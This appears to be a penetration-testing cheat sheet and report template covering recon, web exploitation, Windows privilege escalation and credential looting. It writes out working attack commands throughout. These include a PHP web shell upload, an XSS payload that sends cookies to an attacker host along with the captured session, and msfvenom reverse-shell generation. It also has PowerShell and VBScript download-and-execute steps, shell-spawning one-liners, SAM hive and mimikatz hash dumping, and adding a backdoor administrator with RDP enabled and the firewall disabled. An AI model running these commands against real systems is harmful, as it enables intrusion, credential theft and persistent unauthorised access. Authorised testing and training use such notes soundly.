## Info-sheet


- DNS-Domain name:
- Host name:
- OS:
- Server:
- Workgroup:
- Windows domain:
- Services and ports:

INSERTTCPSCAN


## Recon

```
Always start with a stealthy scan to avoid closing ports.

# Syn-scan
nmap -sS INSERTIPADDRESS

# Service-version, default scripts, OS:
nmap INSERTIPADDRESS -sV -sC -O

# Scan all ports, might take a while.
nmap INSERTIPADDRESS -p-

# Scan for UDP
nmap INSERTIPADDRESS -sU
unicornscan -mU -v -I INSERTIPADDRESS

# Connect to udp if one is open
nc -u INSERTIPADDRESS 48772

# Monster scan
nmap INSERTIPADDRESS -p- -A -T4 -sC
```


### Port 21 - FTP

- Name:
- Version:
- Anonymous login:

INSERTFTPTEST

```
nmap --script=ftp-anon,ftp-libopie,ftp-proftpd-backdoor,ftp-vsftpd-backdoor,ftp-vuln-cve2010-4221,tftp-enum -p 21 INSERTIPADDRESS

Syntax ftp $IP
```

### Port 22 - SSH

- Name:
- Version:
- Protocol:
- RSA-key-fingerprint:
- Takes-password:
If you have usernames test login with username:username
```
Syntax ssh username@$IP
```

INSERTSSHCONNECT


### Port 25

- Name:
- Version:
- VRFY:
- EXPN:

INSERTSMTPCONNECT

```
nc -nvv INSERTIPADDRESS 25
HELO foo<cr><lf>

nmap --script=smtp-commands,smtp-enum-users,smtp-vuln-cve2010-4344,smtp-vuln-cve2011-1720,smtp-vuln-cve2011-1764 -p 25 INSERTIPADDRESS
```
### Port 53 -DNS

#Using dig and some config settings we can use the server itself to resolve the hostname of the server.+

dig @10.13.37.10 -x 10.13.37.10
#-x reverse lookup
#This resolves a hostname for the server. For example www.testsite.com
nano /etc/hosts/

#add the following
10.13.37.10 www.testsite.com

### Port 110 - Pop3

- Name:
- Version:

INSERTPOP3CONNECT

### Port 135 - MSRPC

Some versions are vulnerable.

```
nmap INSERTIPADDRESS --script=msrpc-enum
```

Exploit:

```
msf > use exploit/windows/dcerpc/ms03_026_dcom
```

### Port 139/445 - SMB

- Name:
- Version:
- Domain/workgroup name:
- Domain-sid:
- Allows unauthenticated login:


```
nmap --script=smb-enum-shares.nse,smb-ls.nse,smb-enum-users.nse,smb-mbenum.nse,smb-os-discovery.nse,smb-security-mode.nse,smb-vuln-cve2009-3103.nse,smb-vuln-ms06-025.nse,smb-vuln-ms07-029.nse,smb-vuln-ms08-067.nse,smb-vuln-ms10-054.nse,smb-vuln-ms10-061.nse,smb-vuln-regsvc-dos.nse,smb-vuln-ms17-010.nse INSERTIPADDRESS -p 445

enum4linux -a INSERTIPADDRESS

rpcclient -U "" INSERTIPADDRESS
	srvinfo
	enumdomusers
	getdompwinfo
	querydominfo
	netshareenum
	netshareenumall

smbclient -L INSERTIPADDRESS
smbclient //INSERTIPADDRESS/tmp
smbclient \\\\INSERTIPADDRESS\\ipc$ -U john
smbclient //INSERTIPADDRESS/ipc$ -U john
smbclient //INSERTIPADDRESS/admin$ -U john

Log in with shell:
winexe -U username //INSERTIPADDRESS "cmd.exe" --system

```

### Port 161/162 UDP - SNMP


```
nmap -vv -sV -sU -Pn -p 161,162 --script=snmp-netstat,snmp-processes INSERTIPADDRESS
snmp-check -t INSERTIPADDRESS -c public
```

```
# Common community strings
public
private
community
```



### Port 554 - RTSP


### Port 1030/1032/1033/1038

Used by RPC to connect in domain network. Usually nothing.

### Port 1433 - MSSQL

- Version:

```
use auxiliary/scanner/mssql/mssql_ping

# Last options. Brute force.
scanner/mssql/mssql_login

# Log in to mssql
sqsh -S INSERTIPADDRESS -U sa

# Execute commands
xp_cmdshell 'date'
go
```

If you have credentials look in metasploit for other modules.

## Port 1521 - Oracle

Name:
Version:
Password protected:

```
tnscmd10g version -h INSERTIPADDRESS
tnscmd10g status -h INSERTIPADDRESS
```


### Port 2100 - Oracle XML DB

Can be accessed through ftp.
Some default passwords here: https://docs.oracle.com/cd/B10501_01/win.920/a95490/username.htm
- Name:
- Version:

Default logins:

```
sys:sys
scott:tiger
```

### Port 2049 - NFS

```
showmount -e INSERTIPADDRESS

If you find anything you can mount it like this:

mount INSERTIPADDRESS:/ /tmp/NFS
mount -t INSERTIPADDRESS:/ /tmp/NFS
```

### 3306 - MySQL

- Name:
- Version:

```
mysql --host=INSERTIPADDRESS -u root -p

nmap -sV -Pn -vv -script=mysql-audit,mysql-databases,mysql-dump-hashes,mysql-empty-password,mysql-enum,mysql-info,mysql-query,mysql-users,mysql-variables,mysql-vuln-cve2012-2122 INSERTIPADDRESS -p 3306
```

### Port 3339 - Oracle web interface

- Basic info about web service (apache, nginx, IIS)
- Server:
- Scripting language:
- Apache Modules:
- IP-address:
- Domain-name address:

### Port 3389 - Remote desktop

Test logging in to see what OS is running

```
rdesktop -u guest -p guest INSERTIPADDRESS -g 94%

# Brute force
ncrack -vv --user Administrator -P /root/oscp/passwords.txt rdp://INSERTIPADDRESS
```


### Port 80

- Server:
- Scripting language:
- Apache Modules:
- Domain-name address:

INSERTCURLHEADER


- Web application
- Name:
- Version:

```
# Nikto
nikto -h http://INSERTIPADDRESS

# Nikto with squid proxy
nikto -h INSERTIPADDRESS -useproxy http://INSERTIPADDRESS:4444

# Get header
curl -i INSERTIPADDRESS

# Get everything
curl -i -L INSERTIPADDRESS

# Check if it is possible to upload using put
curl -v -X OPTIONS http://INSERTIPADDRESS/
curl -v -X PUT -d '<?php system($_GET["cmd"]); ?>' http://INSERTIPADDRESS/test/shell.php

# Check for title and all links
dotdotpwn.pl -m http -h INSERTIPADDRESS -M GET -o unix
```


#### Nikto scan


INSERTNIKTOSCAN



#### Url brute force



```
# Dirb
dirb http://INSERTIPADDRESS -r -o dirb-INSERTIPADDRESS.txt

# Gobuster - remove relevant responde codes (403 for example)
gobuster -u http://INSERTIPADDRESS -w /usr/share/seclists/Discovery/Web_Content/common.txt -s '200,204,301,302,307,403,500' -e
```
#### Dirb scan for webapps
```
#Settings
wordlist=/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
file extensions=php, pl, sh, asp, html, json, py, cfm, aspx, rb, cgi

```
INSERTDIRBSCAN


#### Default/Weak login

Google documentation for default passwords and test them:

```
site:webapplication.com password
```

```
admin admin
admin password
admin <blank>
admin nameofservice
root root
root admin
root password
root nameofservice
<username if you have> password
<username if you have> admin
<username if you have> username
<username if you have> nameofservice

./hashcat64.exe -D1 -m 7300 -a 0 -o cracked.txt C:\Users\bigdo\Desktop\ipmi\hash.txt C:\Users\bigdo\Desktop\ipmi\crack.txt

note hash.txt=b7c2d6f13a43dce2e44ad120a9cd8a13d0ca23f0414275c0bbe1070d2d1299b1c04da0f1a0f1e4e2537300263a2200000000000000000000140768617368636174:472bdabe2d5d4bffd6add7b3ba79a291d104a9ef
crack.txt=hashcat
```
#### Wordpress
```
wpscan -u http://target --enumerate users
WordPress Admin Access: Appearance->Editor->404 Template
Navigate to TargetIP/wordpress/wp-content/themes/<name of theme>/404.php
```
#### LFI/RFI

```
# Kadimus
/root/Tools/Kadimus/kadimus -u http://INSERTIPADDRESS/example.php?page=


# Bypass execution
http://INSERTIPADDRESS/index.php?page=php://filter/convert.base64-encode/resource=index
base64 -d savefile.php

# Bypass extension
http://INSERTIPADDRESS/page=http://192.168.1.101/maliciousfile.txt%00
http://INSERTIPADDRESS/page=http://192.168.1.101/maliciousfile.txt?
```


#### SQL-Injection

```
# Post
./sqlmap.py -r search-test.txt -p tfUPass

# Get
sqlmap -u "http://INSERTIPADDRESS/index.php?id=1" --dbms=mysql

# Crawl
sqlmap -u http://INSERTIPADDRESS --dbms=mysql --crawl=3
```

#### Sql-login-bypass


- Open Burp-suite
- Make and intercept request
- Send to intruder
- Cluster attack
- Paste in sqlibypass-list (https://bobloblaw.gitbooks.io/security/content/sql-injections.html)
- Attack
- Check for response length variation

### Password brute force - last resort

```
cewl
```

### Port 443 - HTTPS

Heartbleed:

```
sslscan INSERTIPADDRESS:443
```

## Vulnerability analysis

Now we have gathered information about the system. Now comes the part where we look for exploits and vulnerabilities and features.

### To try - List of possibilities
Add possible exploits here:


### Find sploits - Searchsploit and google

Where there are many exploits for a software, use google. It will automatically sort it by popularity.

```
site:exploit-db.com apache 2.4.7

# Remove dos-exploits

searchsploit Apache 2.4.7 | grep -v '/dos/'
searchsploit Apache | grep -v '/dos/' | grep -vi "tomcat"

# Only search the title (exclude the path), add the -t
searchsploit -t Apache | grep -v '/dos/'
```



----------------------------------------------------------------------------



'''''''''''''''''''''''''''''''''' PRIVESC '''''''''''''''''''''''''''''''''



-----------------------------------------------------------------------------


## Privilege escalation

Now we start the whole enumeration-process over gain. This is a checklist. You need to check of every single one, in this order.

- Kernel exploits
- Cleartext password
- Reconfigure service parameters
- Inside service
- Program running as root
- Installed software
- Scheduled tasks
- Weak passwords



### To-try list
Here you will add all possible leads. What to try.


### Basic info

- OS:
- Version:
- Architecture:
- Current user:
- Hotfixes:
- Antivirus:

**Users:**

**Localgroups:**

```
systeminfo
set
hostname
net users
net user user1
net localgroups
accesschk.exe -uwcqv "Authenticated Users" *
accesschk_v5.02.exe -uwcqv Authenticated Users * /accepteula

netsh firewall show state
netsh firewall show config

# Set path
set PATH=%PATH%;C:\xampp\php
```


### Kernel exploits


```
#Metasploit
post/multi/recon/local_exploit_suggester
# Look for hotfixes
systeminfo

wmic qfe get Caption,Description,HotFixID,InstalledOn

# Search for exploits
site:exploit-db.com windows XX XX
```


### Cleartext passwords

```
# Windows autologin
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon"

# VNC
reg query "HKCU\Software\ORL\WinVNC3\Password"

# SNMP Parameters
reg query "HKLM\SYSTEM\Current\ControlSet\Services\SNMP"

# Putty
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions"

# Search for password in registry
reg query HKLM /f password /t REG_SZ /s
reg query HKCU /f password /t REG_SZ /s
```


### Reconfigure service parameters

- Unquoted service paths

Check book for instructions

- Weak service permissions

Check book for instructions

### Inside service

Check netstat to see what ports are open from outside and from inside. Look for ports only available on the inside.

```
# Meterpreter
run get_local_subnets

netstat /a
netstat -ano
```

### Programs running as root/system



### Installed software

```
# Metasploit
ps

tasklist /SVC
net start
reg query HKEY_LOCAL_MACHINE\SOFTWARE
DRIVERQUERY

Look in:
C:\Program files
C:\Program files (x86)
Home directory of the user
```


### Scheduled tasks

```
schtasks /query /fo LIST /v

Check this file:
c:\WINDOWS\SchedLgU.Txt
```

### Weak passwords

Remote desktop

```
ncrack -vv --user george -P /root/oscp/passwords.txt rdp://INSERTIPADDRESS
```

### Useful commands


**Add user and enable RDP**

```
net user haxxor Haxxor123 /add
net localgroup Administrators haxxor /add
net localgroup "Remote Desktop Users" haxxor /ADD

# Enable RDP
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f

Turn firewall off
netsh firewall set opmode disable

Or like this
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f

If you get this error:

"ERROR: CredSSP: Initialize failed, do you have correct kerberos tgt initialized ?
Failed to connect, CredSSP required by server.""

Add this reg key:

reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v UserAuthentication /t REG_DWORD /d 0 /f
```
# Windows Exploit Suggester
```
windows-exploit-suggester.py --update
windows-exploit-suggester.py --database 2014-06-06-mssb.xlsx --systeminfo win7sp1-systeminfo.txt 
The output shows either public exploits (E), or Metasploit modules (M) as indicated by the character value
```
------------------------------------------------------------------------




----------------------------- LOOT LOOT LOOT LOOT -------------------




------------------------------------------------------------------------


## Loot

- Flags:
- Password and hashes:
- Dualhomed:
- Tcpdump:
- Interesting files:
- Databases:
- SSH-keys:
- Browser:

### Passwords and hashes

```
wce32.exe -w
wce64.exe -w
fgdump.exe

reg.exe save hklm\sam c:\sam_backup
reg.exe save hklm\security c:\security_backup
reg.exe save hklm\system c:\system

# Meterpreter
hashdump
load mimikatz
msv
```

### Dualhomed

```
ipconfig /all
route print

# What other machines have been connected
arp -a
```

### Tcpdump

```
# Meterpreter
run packetrecorder -li
run packetrecorder -i 1
```

### Interesting files

```
#Meterpreter
search -f *.txt
search -f *.zip
search -f *.doc
search -f *.xls
search -f config*
search -f *.rar
search -f *.docx
search -f *.sql

# How to cat files in meterpreter
cat c:\\Inetpub\\iissamples\\sdk\\asp\\components\\adrot.txt

# Recursive search
dir /s
```

### Mail

### Browser

- Browser start-page:
- Browser-history:
- Saved passwords:

### Databases

### SSH-keys

------------------------------------------------------------------------




----------------------------- Notes-------------------------------------




------------------------------------------------------------------------

## XSS


```
<script>alert("XSS")</script>

<script>
new Image().src="http://kali/bogus.php?output="+document.cookie;
</script>

root@kali:~# nc -nlvp 80
listening on [any] 80 ...
connect to [kali] from (UNKNOWN) [target] 49455
GET /bogus.php?output=PHPSESSID=CREDS HTTP/1.1
Accept: */*
Referer: http://127.0.0.1/index.php
Accept-Language: en-US
User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0; SLCC2;
.NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729)
Accept-Encoding: gzip, deflate
Host: 192.168.10.5
Connection: Keep-Alive
```
## Reverse

```
do all in vm
1) try to grab strings for low hanging fruit
2) sublime text
3) IDA Pro in windows is easiest (use ctrl+x to find references/calls to function)
4) N is the hotkey to rename a function in IDA Pro, semicolon is hotkey for comment
5) In immunity debugger view module (select app)
6) searh for all refeed text strings (double click on an error message & success (set breakpoints)
7) Dobule click in cpu for breakpoint
8) inspect jumps
9) modify jumps to not take errors
```

## Shell Spawning
```
python -c 'import pty; pty.spawn("/bin/sh")'
echo os.system('/bin/bash')
/bin/sh -i
perl —e 'exec "/bin/sh";'
perl: exec "/bin/sh";
ruby: exec "/bin/sh"
lua: os.execute('/bin/sh')
```
## (From within IRB)
```
exec "/bin/sh"
(From within vi)
:!bash
```
## (From within vi)
```
:set shell=/bin/bash:shell
```
## (From within nmap)
```
!sh
```
## Command Injection
```
;
&&
|
||
...
```
## Password (Wordlists)
```
john --wordlist=test.txt --stdout --rules:Jumbo >> mutilated.txt
crunch 10 10 -t ,%Curtains -o ./worlist.curtains
```
## Password Cracking
```
Combine the provided passwd (passwd) and shadow (shadow)(shadow) and redirect them to a file (> unshadowed.txt)
unshadow passwd shadow > unshadowed.txt
john --wordlist=rockyou.txt --rules unshadowed.txt 
```
## Web Server
```
python -m SimpleHTTPServer 8000
```
## Quick Base64 Decoder
```
echo aGVsbG8gd2hpdGUgaGF0Cg== | base64 -d
```
## Metasploit Slow Search Fix
```
db_rebuild_cache
msfdb init
```
## SQLMap
```
sqlmap -u 'http://victim.site/view.php?id=1141' -p id --technique=U
```
## Msfvenom
```
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> EXITFUNC=thread -f exe > shell.exe
```
## Powershell Downloader
```
IEX(New-Object Net.WebClient).downloadString('http://KaliIP:8000/Sherlock.ps1; Find-AllVulns')
or modded script
IEX(New-Object Net.WebClient).downloadString('http://KaliIP:8000/vulnSher.ps1')
```
## WGET vbs (copy and paste into shell)
```
echo strUrl = WScript.Arguments.Item(0) > wget.vbs
echo StrFile = WScript.Arguments.Item(1) >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_DEFAULT = 0 >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_PRECONFIG = 0 >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_DIRECT = 1 >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_PROXY = 2 >> wget.vbs
echo Dim http, varByteArray, strData, strBuffer, lngCounter, fs, ts >> wget.vbs
echo Err.Clear >> wget.vbs
echo Set http = Nothing >> wget.vbs
echo Set http = CreateObject("WinHttp.WinHttpRequest.5.1") >> wget.vbs
echo If http Is Nothing Then Set http = CreateObject("WinHttp.WinHttpRequest") >> wget.vbs
echo If http Is Nothing Then Set http = CreateObject("MSXML2.ServerXMLHTTP") >> wget.vbs
echo If http Is Nothing Then Set http = CreateObject("Microsoft.XMLHTTP") >> wget.vbs
echo http.Open "GET", strURL, False >> wget.vbs
echo http.Send >> wget.vbs
echo varByteArray = http.ResponseBody >> wget.vbs
echo Set http = Nothing >> wget.vbs
echo Set fs = CreateObject("Scripting.FileSystemObject") >> wget.vbs
echo Set ts = fs.CreateTextFile(StrFile, True) >> wget.vbs
echo strData = "" >> wget.vbs
echo strBuffer = "" >> wget.vbs
echo For lngCounter = 0 to UBound(varByteArray) >> wget.vbs
echo ts.Write Chr(255 And Ascb(Midb(varByteArray,lngCounter + 1, 1))) >> wget.vbs
echo Next >> wget.vbs
echo ts.Close >> wget.vbs

note: wget.vbs should be 990 bytes
then cscript wget.vbs http://$KaliIP/exploit.exe exploit.exe

```
## How to replicate to otbain access again:
